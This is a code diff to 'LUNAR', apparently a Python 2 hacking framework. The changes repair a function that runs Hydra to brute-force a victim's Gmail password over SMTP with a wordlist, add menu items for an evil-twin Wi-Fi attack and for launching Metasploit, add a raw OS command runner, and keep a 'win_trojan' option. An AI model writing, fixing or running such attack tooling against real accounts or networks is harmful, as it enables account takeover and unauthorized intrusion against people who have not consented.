@@ -28,7 +28,6 @@ import time as t
 import subprocess
 from colorama import init, Fore
 from cryptography.fernet import Fernet
-from fake_useragent import UserAgent
 from urllib2 import Request, urlopen, URLError, HTTPError
 
 
@@ -95,6 +94,8 @@ help_mesg = '''
 {0} └──> {1}History     : Shows command History
 {0} └──> {1}Tools       : Shows all downloadable tools
 {0} └──> {1}c-history   : Clears command history
+{0} └──> {1}os          : Enter a os command
+{0} └──> {1}msf         : Starts Metasploit
 
 {0}[+] {1}Cryptography {2}(7)
 {0} └──> {1}hex_encode  : Encode word(s) to hex
@@ -148,6 +149,7 @@ help_mesg = '''
 {0} └──> {1} traceroute  : Trace an ip
 {0} └──> {1} Whois       : Does a Whois lookup
 {0} └──> {1} tcpscan     : Does a tcp port scan
+{0} └──> {1} Airmonet    : Create a evil twin using Airmon
 
 {0}[+] {1}Web{2} (4)
 {0} └──> {1} sourcecode  : Get source code from website
@@ -250,11 +252,12 @@ def platform_check():
         
 # Modules #
 
+
 def hydra_brute():
     try:
         victum = raw_input(color.GREEN +'[+] '+color.CWHITE + 'Enter a email to brute force: ')
         wordlist = raw_input(color.GREEN +'[+] '+color.CWHITE + 'Enter a wordlist file ')
-        os.system('hydra smtp.gmail.com smtp -l {0} -P {1} -s 465 -S -v -V').format(victum, wordlsit)
+        os.system(str('hydra smtp.gmail.com smtp -l {0} -P {1} -s 465 -S -v -V').format(victum, wordlist))
     except KeyboardInterrupt:
         main()
 
@@ -862,7 +865,7 @@ def main():
     while True:
         global history
         try:
-            option_framework = raw_input(color.CWHITE + '[home][LUNAR] > '+color.CWHITE)
+            option_framework = raw_input(color.YELLOW + 'LUNAR > '+color.CWHITE)
             history.append(option_framework)
             if option_framework.lower()  == '/':
                 last_command = len(history)
@@ -1015,7 +1018,7 @@ def main():
                 print tools
             if option_framework.lower() == 'exit':
                     ErrorLog('Exiting\n')
-                    log_file  = open(x+'\log.txt','a+')
+                    log_file  = open(x+'/log.txt','a+')
                     global start_time
                     end_time = datetime.datetime.now()
                     time = '\n'+ str(start_time.hour) + ':' + str(start_time.minute) + ' => ' + str(end_time.hour) + ':' + str(end_time.minute)
@@ -1052,7 +1055,13 @@ def main():
             if option_framework.lower() == 'win_trojan':
                 win_trojan()
             if option_framework.lower() == 'hydra':
-                hydra_brute()           
+                hydra_brute()
+            if option_framework.lower() == 'os':
+                try:
+                    command = raw_input(color.GREEN + '[+] '+color.CWHITE+ 'Enter a command: ')
+                    subprocess.call(command)    
+                except:
+                    main()       
         except KeyboardInterrupt:
             ErrorLog('Exit using the command "exit"')
 
